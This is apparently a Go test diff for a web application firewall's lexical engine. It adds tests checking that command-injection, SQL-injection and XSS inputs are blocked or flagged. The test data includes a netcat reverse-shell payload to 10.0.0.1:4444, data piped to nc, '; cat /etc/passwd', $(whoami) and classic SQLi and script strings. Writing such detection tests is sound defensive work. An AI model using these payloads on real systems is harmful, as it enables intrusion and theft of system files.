@@ -150,3 +150,132 @@ func TestLexicalEngineXSSDetection(t *testing.T) {
 		})
 	}
 }
+
+func TestLexicalEngineCmdIDetection(t *testing.T) {
+	eng := NewLexicalEngine()
+
+	tests := []struct {
+		name        string
+		ctx         *RequestContext
+		expectBlock bool
+		expectRule  string
+	}{
+		{
+			name: "Benign input with harmless characters",
+			ctx: &RequestContext{
+				Path:  "/status",
+				Query: "system=online&version=2.0",
+			},
+			expectBlock: false,
+		},
+		{
+			name: "Command injection in query param with semicolon and binary",
+			ctx: &RequestContext{
+				Path:  "/ping",
+				Query: "host=127.0.0.1%3B+cat+%2Fetc%2Fpasswd",
+			},
+			expectBlock: true,
+			expectRule:  "CMDI_QUERY_PARAM",
+		},
+		{
+			name: "Command injection with substitution $(whoami)",
+			ctx: &RequestContext{
+				Path:  "/exec",
+				Query: "name=%24%28whoami%29",
+			},
+			expectBlock: true,
+			expectRule:  "CMDI_QUERY_PARAM",
+		},
+		{
+			name: "Command injection with pipe and nc",
+			ctx: &RequestContext{
+				Path:  "/export",
+				Query: "file=report.csv%7Cnc+-e+%2Fbin%2Fsh+10.0.0.1+4444",
+			},
+			expectBlock: true,
+			expectRule:  "CMDI_QUERY_PARAM",
+		},
+		{
+			name: "Command injection in raw query",
+			ctx: &RequestContext{
+				Path:  "/export",
+				Query: "report.csv | nc 10.0.0.1 4444",
+			},
+			expectBlock: true,
+			expectRule:  "CMDI_QUERY",
+		},
+		{
+			name: "Command injection with backticks in body",
+			ctx: &RequestContext{
+				Path: "/run",
+				Body: []byte("param=`id`"),
+			},
+			expectBlock: true,
+			expectRule:  "CMDI_BODY",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			verdict, err := eng.InspectRequest(tt.ctx)
+			if err != nil {
+				t.Fatalf("unexpected error: %v", err)
+			}
+			if tt.expectBlock {
+				if verdict.Action != ActionBlock {
+					t.Fatalf("expected ActionBlock, got %v", verdict.Action)
+				}
+				if verdict.RuleID != tt.expectRule {
+					t.Errorf("expected RuleID %q, got %q", tt.expectRule, verdict.RuleID)
+				}
+			} else {
+				if verdict.Action != ActionAllow {
+					t.Fatalf("expected ActionAllow, got %v", verdict.Action)
+				}
+			}
+		})
+	}
+}
+
+func TestTriageClassification(t *testing.T) {
+	tests := []struct {
+		input    string
+		expected TriageResult
+	}{
+		{"", TriageBenign},
+		{"normal_text_value", TriageBenign},
+		{"product_id=12345", TriageBenign},
+		{"1' OR '1'='1", TriageSuspectSQLi},
+		{"admin' --", TriageSuspectSQLi},
+		{"<script>alert(1)</script>", TriageSuspectXSS},
+		{"; cat /etc/passwd", TriageSuspectCmdI},
+		{"$(whoami)", TriageSuspectCmdI},
+		{"`id`", TriageSuspectCmdI},
+		{"| nc 127.0.0.1 1337", TriageSuspectCmdI},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.input, func(t *testing.T) {
+			res := Triage(tt.input)
+			if res != tt.expected {
+				t.Errorf("Triage(%q) = %v, expected %v", tt.input, res, tt.expected)
+			}
+		})
+	}
+}
+
+func BenchmarkLexicalTriage(b *testing.B) {
+	payloads := []string{
+		"category=electronics&brand=apple&sort=price_asc&page=2",
+		"admin' OR 1=1--",
+		"<script>alert('xss')</script>",
+		"127.0.0.1; cat /etc/passwd",
+		"normal simple search string",
+	}
+
+	b.ResetTimer()
+	for i := 0; i < b.N; i++ {
+		p := payloads[i%len(payloads)]
+		_ = Triage(p)
+	}
+}
